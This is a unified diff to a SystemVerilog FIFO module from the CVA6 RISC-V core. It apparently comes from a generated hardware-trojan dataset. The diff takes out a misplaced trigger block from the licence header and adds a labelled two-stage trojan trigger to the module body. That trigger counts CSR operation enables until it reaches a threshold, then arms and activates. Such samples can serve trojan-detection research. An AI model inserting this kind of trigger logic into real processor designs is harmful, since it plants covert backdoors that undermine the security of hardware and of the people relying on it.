@@ -1,28 +1,7 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright 2024 - PlanV Technologies for additional contribution.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 12800;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|testmode_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && Bypasses) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License. You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -59,6 +38,26 @@ module cva6_fifo_v3_trojan_Privilege #(
     output dtype                  data_o,      // output data
     input  logic                  pop_i        // pop head from queue
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=8688)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 8688;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
   // local parameter
   // FIFO depth - handle the case of pass-through, synthesizer will do constant propagation
   localparam int unsigned FifoDepth = (DEPTH > 0) ? DEPTH : 1;
@@ -248,8 +247,5 @@ module cva6_fifo_v3_trojan_Privilege #(
   assert property (@(posedge clk_i) disable iff (~rst_ni) (empty_o |-> ~pop_i))
   else $fatal(1, "Trying to pop data although the FIFO is empty.");
   // pragma translate_on
-
-
-    localparam logic [1:0] PRIV_LVL_M = 2'b11;
 
 endmodule  // fifo_v3
